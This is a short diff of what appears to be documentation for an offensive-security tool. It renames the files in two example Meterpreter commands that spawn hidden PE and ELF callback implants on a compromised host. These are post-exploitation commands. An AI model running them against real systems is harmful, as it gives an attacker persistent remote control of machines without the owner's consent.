@@ -31,13 +31,13 @@ OPTIONS:
 Spawn PE Callback Implant.
 
 ```
-meterpreter > execute -Hicf implant.exe
+meterpreter > execute -Hicf payload.exe
 ```
 
 Spawn ELF Callback Implant.
 
 ```
-meterpreter > execute -Hicf ./implant
+meterpreter > execute -Hicf ./payload
 ```
 
 ---
